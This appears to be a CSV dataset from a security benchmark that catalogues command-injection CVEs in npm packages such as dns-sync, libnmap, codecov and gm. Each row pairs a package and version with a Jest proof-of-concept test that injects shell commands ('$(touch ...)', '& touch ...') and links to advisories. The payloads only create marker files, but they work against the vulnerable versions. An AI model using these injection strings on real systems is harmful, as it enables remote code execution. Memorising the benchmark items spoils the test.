Attack Type,CVE-ID,Package,Version,Fix Version,Exploit File Path,Exploit,Fixed Commit,Sink,Links
command-injection,CVE-2014-9682,dns-sync,0.1.0,0.1.3,command-injection/dns-sync_0.1.0,"test(""Command Injection in dns-sync"", () => {
  expect.assertions(2);
  const dnsSync = require(""dns-sync"");
  const fs = require(""fs"");
  const path = ""./dns-sync"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  dnsSync.resolve(""$(touch dns-sync)"");
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",https://github.com/skoranga/node-dns-sync/commit/d9abaae384b198db1095735ad9c1c73d7b890a0d,lib/dns-sync.js:21:26,https://security.snyk.io/vuln/npm:dns-sync:20141111; https://github.com/advisories/GHSA-q5pq-pgrv-fh89
command-injection,,arpping,2.0.0,3.0.0,command-injection/arpping_2.0.0,"test(""Remote code execution in arpping"", () => {
  expect.assertions(2);
  const Arpping = require(""arpping"");
  const fs = require(""fs"");
  const path = ""./arpping"";
  let arpping = new Arpping();
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  return arpping
    .ping(["";touch arpping;""])
    .then(() => {})
    .catch((err) => console.log(err))
    .finally(() => {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {});
    });
});
",https://github.com/haf-decent/arpping/commit/0db06723f8c3c73a5cc0829c667d45cba25ca44d,index.js:120:13,https://security.snyk.io/vuln/SNYK-JS-ARPPING-1060047; 
command-injection,CVE-2020-7784,ts-process-promises,1.0.2,,command-injection/ts-process-promises_1.0.2,"test(""Command Injection in ts-process-promises"", () => {
  expect.assertions(2);
  const a = require(""ts-process-promises"");
  const fs = require(""fs"");
  const path = ""./ts-process-promises"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  return a.exec(""touch ts-process-promises"", {}).finally(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {});
  });
});
",,lib/process-promises.js:45:31,https://security.snyk.io/vuln/SNYK-JS-TSPROCESSPROMISES-1048334; https://github.com/advisories/GHSA-ww4j-c2rq-47q8
command-injection,CVE-2020-7630,git-add-remote,1.0.0,,command-injection/git-add-remote_1.0.0,"test(""Command Injection in git-add-remote"", (done) => {
  expect.assertions(2);
  const root = require(""git-add-remote"")();
  const fs = require(""fs"");
  const path = ""./git-add-remote"";
  let payload = ""& touch git-add-remote"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  root(payload, """", function () {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
",,index.js:21:8,https://security.snyk.io/vuln/SNYK-JS-GITADDREMOTE-564269; 
command-injection,CVE-2020-7631,diskusage-ng,0.2.6,1.0.0,command-injection/diskusage-ng_0.2.6,"test(""Command Injection in diskusage-ng"", (done) => {
  expect.assertions(2);
  const root = require(""diskusage-ng"");
  const fs = require(""fs"");
  const path = ""./diskusage-ng"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  root(['""&touch diskusage-ng""'], () => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlinkSync(path);
    done();
  });
});
",https://github.com/iximiuz/node-diskusage-ng/commit/48e7e093486b528f0c81ec699573e0e4a431b8d3#diff-38182cfe286a150ebcc88df0ec57ed66,lib/posix.js:11:5,https://security.snyk.io/vuln/SNYK-JS-DISKUSAGENG-564425; https://github.com/advisories/GHSA-3269-x4pw-vffg
command-injection,CVE-2020-7781,connection-tester,0.2.0,0.2.1,command-injection/connection-tester_0.2.0,"test(""Command Injection in connection-tester"", () => {
  expect.assertions(2);
  const a = require(""connection-tester"");
  const fs = require(""fs"");
  const path = ""./connection-tester"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    a.test(""& touch connection-tester"", 123, 1000);
  } catch (error) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlinkSync(path);
  fs.unlinkSync(""1000"");
  fs.unlinkSync(""123"");
});
",,index.js:15:28,https://security.snyk.io/vuln/SNYK-JS-CONNECTIONTESTER-1048337; https://github.com/advisories/GHSA-w5mp-8p8w-mhh8
command-injection,CVE-2020-6836,hot-formula-parser,3.0.0,3.0.1,command-injection/hot-formula-parser_3.0.0,"test(""Command Injection in hot-formula-parser"", () => {
  expect.assertions(2);
  const FormulaParser = require(""hot-formula-parser"").Parser;
  const fs = require(""fs"");
  const path = ""./hot-formula-parser"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let parser = new FormulaParser();
  parser.parse(
    ""SUM([(function(){require('child_process').execSync('touch hot-formula-parser')})(),2])""
  );
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",https://github.com/handsontable/formula-parser/commit/396b089738d4bf30eb570a4fe6a188affa95cd5e,lib/grammar-parser/grammar-parser.js:258:31,https://security.snyk.io/vuln/SNYK-JS-HOTFORMULAPARSER-541328; https://github.com/advisories/GHSA-rc77-xxq6-4mff
command-injection,CVE-2021-23380,roar-pidusage,1.1.6,,command-injection/roar-pidusage_1.1.6,"test(""Command Injection in roar-pidusage"", (done) => {
  expect.assertions(1);
  const os = require(""os"");
  os.platform = () => {
    return ""freebsd"";
  };
  const roar_pidusage = require(""roar-pidusage"");
  const fs = require(""fs"");
  const path = ""./roar-pidusage"";
  roar_pidusage.stat(""$(touch roar-pidusage)"", function () {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
",,lib/stats.js:103:5,https://security.snyk.io/vuln/SNYK-JS-ROARPIDUSAGE-1078528; https://github.com/advisories/GHSA-xfxf-qw26-hr33
command-injection,CVE-2018-16461,libnmap,0.4.11,0.4.16,command-injection/libnmap_0.4.11,"test(""Command Injection in libnmap"", (done) => {
  expect.assertions(2);
  const nmap = require(""libnmap"");
  const fs = require(""fs"");
  const path = ""./libnmap"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  const opts = {
    range: [""scanme.nmap.org"", ""x.x.$(touch libnmap)""],
  };
  nmap.scan(opts, function (err, report) {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
",https://github.com/jas-/node-libnmap/commit/c235b24b0342e12a5dbf502f89daabe95883b6c8,lib/classes/tools.js:114:25,https://security.snyk.io/vuln/SNYK-JS-LIBNMAP-72551; https://github.com/advisories/GHSA-7g2w-6r25-2j7p
command-injection,CVE-2020-7636,git-tags-remote,1.0.2,,command-injection/git-tags-remote_1.0.2,"test(""Command Injection in git-tags-remote"", () => {
  expect.assertions(2);
  const gitTagsRemote = require(""git-tags-remote"");
  const fs = require(""fs"");
  const path = ""./git-tags-remote"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  return gitTagsRemote
    .get(
      ""https://github.com/sh0ji/git-tags-remote.git; touch git-tags-remote > /tmp/command-injection.test""
    )
    .finally((tags) => {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {});
    });
});
",,index.js:5:2,https://security.snyk.io/vuln/SNYK-JS-GITTAGSREMOTE-596503; https://github.com/advisories/GHSA-4m6q-rxhm-675w
command-injection,,open,0.0.5,6.0.0,command-injection/open_0.0.5,"test(""Command Injection in open"", (done) => {
  expect.assertions(2);
  const fs = require(""fs"");
  const path = ""./open"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  require(""open"")('""""`touch open`');
  setTimeout(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, () => {
      done();
    });
  }, 500);
});
",,lib/open.js:58:10,https://security.snyk.io/vuln/npm:open:20180512; https://github.com/advisories/GHSA-28xh-wpgr-7fm8
command-injection,CVE-2021-23381,killing,1.0.6,,command-injection/killing_1.0.6,"test(""Command Injection in killing"", (done) => {
  const killing = require(""killing"");
  const fs = require(""fs"");
  const path = ""./killing"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  let file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  killing(""$(touch killing & exit 1)"");
  setTimeout(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, () => {
      done();
    });
  }, 500);
});
",,lib/killing.js:35:7,https://security.snyk.io/vuln/SNYK-JS-KILLING-1078532; https://github.com/advisories/GHSA-cq77-8jpx-892g
command-injection,CVE-2018-16462,apex-publish-static-files,2.0.0,2.0.1,command-injection/apex-publish-static-files_2.0.0,"test(""Command Injection in apex-publish-static-files"", () => {
  expect.assertions(2);
  const publisher = require(""apex-publish-static-files"");
  const fs = require(""fs"");
  const path = ""./apex-publish-static-files"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    publisher.publish({
      connectString: "";touch apex-publish-static-files;"",
      directory: ""./"",
      appID: 111,
    });
  } catch (err) {
  } finally {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {});
  }
});
",https://github.com/vincentmorneau/apex-publish-static-files/commit/2209af8f2b65c24aa55ab757e0e05b958c16f063,index.js:54:25,https://security.snyk.io/vuln/SNYK-JS-APEXPUBLISHSTATICFILES-72552; https://github.com/advisories/GHSA-9jm3-5835-537m
command-injection,CVE-2019-10776,command-exists,1.2.2,0.22.2,command-injection/command-exists_1.2.2,"test(""Command Injection in command-exists"", () => {
  expect.assertions(2);
  const commandExists = require(""command-exists"");
  const fs = require(""fs"");
  const path = ""./command-exists"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  commandExists.sync("";touch command-exists"");
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",https://github.com/kellyselden/git-diff-apply/commit/106d61d3ae723b4257c2a13e67b95eb40a27e0b5,lib/command-exists.js:78:22,https://security.snyk.io/vuln/npm:command-exists:20180512; https://github.com/advisories/GHSA-84cm-v6jp-gjmr
command-injection,CVE-2019-10776,scp,0.0.3,0.22.2,command-injection/scp_0.0.3,"test(""Command Injection in scp"", (done) => {
  expect.assertions(2);
  const scp = require(""scp"");
  const fs = require(""fs"");
  const path = ""./scp"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let options = {
    file: ""& touch scp; #"",
    user: ""username"",
    host: ""myServer"",
    port: ""20"",
    path: ""~"",
  };
  scp.send(options, function (err) {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
",https://github.com/kellyselden/git-diff-apply/commit/106d61d3ae723b4257c2a13e67b95eb40a27e0b5,scp.js:21:3,https://security.snyk.io/vuln/SNYK-JS-SCP-1009828; https://github.com/advisories/GHSA-84cm-v6jp-gjmr
command-injection,CVE-2020-28440,corenlp-js-interface,1.0.3,,command-injection/corenlp-js-interface_1.0.3,"test(""Command Injection in corenlp-js-interface"", () => {
  expect.assertions(2);
  const a = require(""corenlp-js-interface"");
  const fs = require(""fs"");
  const path = ""./corenlp-js-interface"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  a(""') touch corenlp-js-interface # '"", """", """", """");
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",,index.js:5:20,https://security.snyk.io/vuln/SNYK-JS-CORENLPJSINTERFACE-1050435; https://github.com/advisories/GHSA-ffxg-xm4w-3wg9
command-injection,CVE-2017-16034,pidusage,1.0.0,1.1.5,command-injection/pidusage_1.0.0,"test(""Command Injection in pidusage"", (done) => {
  expect.assertions(1);
  const os = require(""os"");
  os.platform = () => {
    return ""freebsd"";
  };
  const roar_pidusage = require(""pidusage"");
  const fs = require(""fs"");
  const path = ""./pidusage"";
  roar_pidusage.stat(""$(touch pidusage)"", function () {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
",https://github.com/soyuka/pidusage/commit/b70eca15f7ca7f1b82a15f8a5d4bb48737f5a89d,lib/stats.js:108:5,https://security.snyk.io/vuln/npm:pidusage:20170605; https://github.com//advisories/GHSA-hfq9-rfpv-j8r8
command-injection,CVE-2020-28447,xopen,1.0.0,,command-injection/xopen_1.0.0,"test(""Command Injection in xopen"", () => {
  expect.assertions(2);
  const root = require(""xopen"");
  const fs = require(""fs"");
  const path = ""./xopen"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let attack_code = ""& touch xopen"";
  return root(attack_code).finally(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {});
  });
});
",,index.js:13:5,https://security.snyk.io/vuln/SNYK-JS-XOPEN-1050981; 
command-injection,CVE-2020-28435,ffmpeg-sdk,0.0.5,,command-injection/ffmpeg-sdk_0.0.5,"test(""Command Injection in ffmpeg-sdk"", () => {
  expect.assertions(2);
  const root = require(""ffmpeg-sdk"");
  const fs = require(""fs"");
  const path = ""./ffmpeg-sdk"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  return root
    .execute(""touch ffmpeg-sdk"")
    .then(() => {})
    .catch((err) => {})
    .finally(() => {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {});
    });
});
",,index.js:9:5,https://security.snyk.io/vuln/SNYK-JS-FFMPEGSDK-1050429; 
command-injection,CVE-2020-7636,adb-driver,0.1.8,,command-injection/adb-driver_0.1.8,"test(""Command Injection in adb-driver"", () => {
  expect.assertions(2);
  const root = require(""adb-driver"");
  const fs = require(""fs"");
  const path = ""./adb-driver"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  return root.execADBCommand("" & touch adb-driver"").finally(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {});
  });
});
",,build/AdbDriver.js:26:25,https://security.snyk.io/vuln/SNYK-JS-ADBDRIVER-564430; https://github.com/advisories/GHSA-4m6q-rxhm-675w
command-injection,CVE-2021-23363,kill-by-port,0.0.1,0.0.2,command-injection/kill-by-port_0.0.1,"test(""Command Injection in kill-by-port"", () => {
  expect.assertions(2);
  const kill_by_port = require(""kill-by-port"");
  const fs = require(""fs"");
  const path = ""./kill-by-port"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  let file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  kill_by_port.killByPort(""$(touch kill-by-port)"");
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, () => {});
});
",https://github.com/GuyMograbi/kill-by-port/commit/ea5b1f377e196a4492e05ff070eba8b30b7372c4,index.js:8:17,https://security.snyk.io/vuln/SNYK-JS-KILLBYPORT-1078531; https://github.com/advisories/GHSA-mm4f-47ch-f7hx
command-injection,CVE-2020-15123,codecov,3.6.4,3.7.1,command-injection/codecov_3.6.4,"process.on(""unhandledRejection"", () => {});
test(""Command Injection in codecov"", async () => {
  expect.assertions(2);
  const root = require(""codecov"");
  const fs = require(""fs"");
  const path = ""./codecov"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let args = {
    options: {
      ""gcov-root"": ""& touch codecov &"",
      ""gcov-exec"": "" "",
      ""gcov-args"": "" "",
    },
  };
  try {
    await root.handleInput.upload(
      args,
      function () {
        console.log(""success"");
      },
      function () {
        console.log(""Fail!"");
      }
    );
  } catch (error) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",https://github.com/codecov/codecov-node/commit/c0711c656686e902af2cd92d6aecc8074de4d83d,lib/codecov.js:419:7,https://security.snyk.io/vuln/SNYK-JS-CODECOV-585979; https://github.com/advisories/GHSA-xp63-6vf5-xf3v
command-injection,CVE-2020-7794,buns,1.1.6,,command-injection/buns_1.1.6,"test(""Command Injection in buns"", () => {
  expect.assertions(2);
  var root = require(""buns"");
  const fs = require(""fs"");
  const path = ""./buns"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  var name = ""& touch buns"";
  try {
    root.install(name);
  } catch (error) {
  } finally {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {});
  }
});
",,lib/index.js:678:9,https://security.snyk.io/vuln/SNYK-JS-BUNS-1050389; https://github.com/advisories/GHSA-487w-pqcm-63hq
command-injection,CVE-2021-23359,port-killer,1.0.1,,command-injection/port-killer_1.0.1,"test(""Command Injection in port-killer"", () => {
  expect.assertions(2);
  const port_killer = require(""port-killer"");
  const fs = require(""fs"");
  const path = ""./port-killer"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  port_killer(""$(touch port-killer)"");
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",,index.js:19:9,https://security.snyk.io/vuln/SNYK-JS-PORTKILLER-1078533; https://github.com/advisories/GHSA-2548-q746-x5x6
command-injection,CVE-2020-28431,wc-cmd,1.0.9,,command-injection/wc-cmd_1.0.9,"test(""Command Injection in wc-cmd"", (done) => {
  expect.assertions(2);
  const a = require(""wc-cmd"");
  const fs = require(""fs"");
  const path = ""./wc-cmd"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  a(""touch wc-cmd"", () => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
",,index.js:49:19,https://security.snyk.io/vuln/SNYK-JS-WCCMD-1050423; https://github.com/advisories/GHSA-mx3r-w3pj-7wv7
command-injection,CVE-2015-7982,gm,1.20.0,=1.20.0,command-injection/gm_1.20.0,"const { doesNotMatch } = require(""assert"");
test(""Command Injection in gm"", (done) => {
  expect.assertions(2);
  const gm = require(""gm"");
  const fs = require(""fs"");
  const path = ""./gm"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  gm.compare(""$(touch gm)"", ""/path/to/another.png"", function (
    err,
    isEqual,
    equality,
    raw,
    path1,
    path2
  ) {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
",,lib/compare.js:72:5,https://security.snyk.io/vuln/npm:gm:20151026; https://github.com/advisories/GHSA-pjh3-jv7w-9jpr
command-injection,CVE-2021-23355,ps-kill,1.0.0,,command-injection/ps-kill_1.0.0,"test(""Command Injection in ps-kill"", (done) => {
  expect.assertions(3);
  expect.assertions(2);
  const ps_kill = require(""ps-kill"");
  const fs = require(""fs"");
  const path = ""./ps-kill"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  ps_kill.kill(""$(touch ps-kill)"", function (error) {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
",,index.js:8:3,https://security.snyk.io/vuln/SNYK-JS-PSKILL-1078529; https://github.com/advisories/GHSA-7qmm-q394-fmch
command-injection,CVE-2020-26707,aaptjs,1.3.1,,command-injection/aaptjs_1.3.1,"test(""Remote code execution in aaptjs"", (done) => {
  const aaptjs = require(""aaptjs"");
  const fs = require(""fs"");
  const path = ""./aaptjs"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    aaptjs.list(""; touch aaptjs"", (err, data) => {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {
        done();
      });
    });
  } catch (error) {}
});
",,index.js:18:3,https://security.snyk.io/vuln/SNYK-JS-AAPTJS-1769273; https://github.com/advisories/GHSA-m7p2-ghfh-pjvx
command-injection,CVE-2020-28439,corenlp-js-prefab,1.0.1,,command-injection/corenlp-js-prefab_1.0.1,"test(""Command Injection in corenlp-js-prefab"", (done) => {
  expect.assertions(2);
  const a = require(""corenlp-js-prefab"");
  const fs = require(""fs"");
  const path = ""./corenlp-js-prefab"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    a.process(""') touch corenlp-js-prefab # '"");
  } catch (error) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {
    done();
  });
});
",,index.js:10:16,https://security.snyk.io/vuln/SNYK-JS-CORENLPJSPREFAB-1050434; https://github.com/advisories/GHSA-h73g-8g27-xxcx
command-injection,CVE-2020-28436,google-cloudstorage-commands,0.0.1,,command-injection/google-cloudstorage-commands_0.0.1,"test(""Command Injection in google-cloudstorage-commands"", () => {
  expect.assertions(2);
  var root = require(""google-cloudstorage-commands"");
  const fs = require(""fs"");
  const path = ""./google-cloudstorage-commands"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  return root
    .upload(""./"", ""& touch google-cloudstorage-commands"", true)
    .finally(() => {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {});
    });
});
",,index.js:11:24,https://security.snyk.io/vuln/SNYK-JS-GOOGLECLOUDSTORAGECOMMANDS-1050431; 
command-injection,CVE-2019-10783,lsof,0.1.0,,command-injection/lsof_0.1.0,"const { doesNotMatch } = require(""assert"");
test(""Command Injection in lsof"", (done) => {
  expect.assertions(2);
  const root = require(""lsof"");
  const fs = require(""fs"");
  const path = ""./lsof"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let attack_code = ""& touch lsof &"";
  root.rawTcpPort(attack_code, function () {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
",,lib/lsof.js:37:8,https://security.snyk.io/vuln/SNYK-JS-LSOF-543632; https://github.com/advisories/GHSA-whq6-mj2r-mjqc
command-injection,CVE-2018-13797,macaddress,0.2.8,0.2.9,command-injection/macaddress_0.2.8,"test(""Command Injection in macaddress"", (done) => {
  expect.assertions(2);
  const fs = require(""fs"");
  const path = ""./macaddress"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let iface = ""; touch macaddress; echo "";
  require(""macaddress"").one(iface, function (err, mac) {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
",https://github.com/scravy/node-macaddress/commit/358fd594adb196a86b94ac9c691f69fe5dad2332,lib/unix.js:4:5,https://security.snyk.io/vuln/npm:macaddress:20180511; https://github.com/advisories/GHSA-pp57-mqmh-44h7
command-injection,CVE-2020-7624,effect,1.0.4,,command-injection/effect_1.0.4,"test(""Command Injection in effect"", (done) => {
  expect.assertions(2);
  const Root = require(""effect"");
  const fs = require(""fs"");
  const path = ""./effect"";
  var options = { image: ""& touch effect"" };
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  Root.edge(options, () => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    try {
      fs.unlinkSync(""-colorspace"");
      fs.unlinkSync(""-edge"");
      fs.unlinkSync(""-negate"");
      fs.unlinkSync(""-resize"");
      fs.unlinkSync(""5"");
      fs.unlinkSync(""100%"");
      fs.unlinkSync(""Gray"");
      fs.unlinkSync(path);
    } catch (err) {}
    done();
  });
});
",,helper.js:24:5,https://security.snyk.io/vuln/SNYK-JS-EFFECT-564256; 
